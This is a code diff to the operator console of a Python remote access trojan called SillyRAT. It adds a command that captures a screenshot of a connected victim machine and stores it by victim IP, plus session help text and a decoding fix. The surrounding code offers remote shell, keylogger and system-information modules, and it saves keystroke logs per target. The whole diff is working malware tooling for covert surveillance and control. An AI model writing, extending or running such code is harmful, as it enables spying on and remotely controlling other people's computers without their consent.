@@ -93,6 +93,7 @@ class PULL:
             ('shell'  , 'Launch a New Terminal/Shell.'),
             ('keylogger', 'KeyLogger Module'),
             ('sysinfo', 'Dump System, Processor, CPU and Network Information'),
+            ('screenshot', 'Take Screenshot on Target Machine and Save on Local'),
             ('exit', 'Exit from SillyRAT!')
         ]
         sys.stdout.write("\n")
@@ -111,6 +112,35 @@ class PULL:
         ]
         sys.stdout.write("\n")
         print(tabulate.tabulate(lister, headers=headers))
+        sys.stdout.write("\n")
+
+    def help_c_sessions(self):
+        sys.stdout.write("\n")
+        print("Info       : Display connected sessions to the server!")
+        print("Arguments  : None")
+        print("Example    : \n")
+        print("$ sessions")
+        sys.stdout.write("\n")
+
+    def help_c_connect(self):
+        sys.stdout.write("\n")
+        print("Info       : Connect to an available session!")
+        print("Arguments  : Session ID")
+        print("Example    : \n")
+        print("$ connect 56\n")
+        headers = (pull.BOLD + 'Argument' + pull.END, pull.BOLD + 'Type' + pull.END, pull.BOLD + 'Description' + pull.END)
+        lister  = [
+            ('ID', 'integer', 'ID of the sessions from the list')
+        ]
+        print(tabulate.tabulate(lister, headers=headers))
+        sys.stdout.write("\n")
+
+    def help_c_disconnect(self):
+        sys.stdout.write("\n")
+        print("Info       : Disconnect current session!")
+        print("Arguments  : None")
+        print("Example    : \n")
+        print("$ disconnect")
         sys.stdout.write("\n")
 
 pull = PULL()
@@ -137,7 +167,10 @@ class CLIENT:
                 break
             data += chunk.decode('utf-8')
             if self.KEY.encode('utf-8') in chunk:
-                self.MESSAGE = base64.decodebytes(data.rstrip(self.KEY).encode('utf-8')).decode('utf-8')
+                try:
+                    self.MESSAGE = base64.decodebytes(data.rstrip(self.KEY).encode('utf-8')).decode('utf-8')
+                except UnicodeDecodeError:
+                    self.MESSAGE = base64.decodebytes(data.rstrip(self.KEY).encode('utf-8'))
                 if not self.MESSAGE:
                     self.MESSAGE = " "
                 data = ""
@@ -169,7 +202,12 @@ class COMMCENTER:
 
     def c_help(self, vals):
         if len(vals) > 1:
-            print("worker")
+            if vals[1] == "sessions":
+                pull.help_c_sessions()
+            elif vals[1] == "connect":
+                pull.help_c_connect()
+            elif vals[1] == "disconnect":
+                pull.help_c_disconnect()
         else:
             if self.CURRENT:
                 pull.help_c_current()
@@ -267,10 +305,10 @@ class COMMCENTER:
                     dirname = os.path.join( dirname, 'keylogs' )
                     if not os.path.isdir(dirname):
                         os.mkdir(dirname)
-                    dirname = os.path.join( dirname, '%s:%d' % (self.CURRENT[1].ip, self.CURRENT[1].port) )
+                    dirname = os.path.join( dirname, '%s' % (self.CURRENT[1].ip) )
                     if not os.path.isdir(dirname):
                         os.mkdir(dirname)
-                    fullpath = os.path.join( dirname, datetime.now().strftime("%d-%m-%Y %H:%M:%S") )
+                    fullpath = os.path.join( dirname, datetime.now().strftime("%d-%m-%Y %H:%M:%S.txt") )
                     fl = open( fullpath, 'w' )
                     fl.write( result )
                     fl.close()
@@ -289,6 +327,25 @@ class COMMCENTER:
             result = self.CURRENT[1].recv_data()
             if result.strip(" "):
                 print(result)
+        else:
+            pull.error("You need to connect before execute this command!")
+
+    def c_screenshot(self):
+        if self.CURRENT:
+            self.CURRENT[1].send_data("screenshot:")
+            result = self.CURRENT[1].recv_data()
+            dirname = os.path.dirname(__file__)
+            dirname = os.path.join( dirname, 'screenshots' )
+            if not os.path.isdir(dirname):
+                os.mkdir(dirname)
+            dirname = os.path.join( dirname, '%s' % (self.CURRENT[1].ip) )
+            if not os.path.isdir(dirname):
+                os.mkdir(dirname)
+            fullpath = os.path.join( dirname, datetime.now().strftime("%d-%m-%Y %H:%M:%S.png") )
+            fl = open( fullpath, 'wb' )
+            fl.write( result )
+            fl.close()
+            pull.print("Saved: [" + pull.DARKCYAN + fullpath + pull.END + "]")
         else:
             pull.error("You need to connect before execute this command!")
 
@@ -369,6 +426,8 @@ class INTERFACE(COMMCENTER):
                 self.c_keylogger(vals)
             elif vals[0] == "sysinfo":
                 self.c_sysinfo()
+            elif vals[0] == "screenshot":
+                self.c_screenshot()
 
     def launch(self):
         pull.print("Launching Interface! Enter 'help' to get avaible commands! \n")
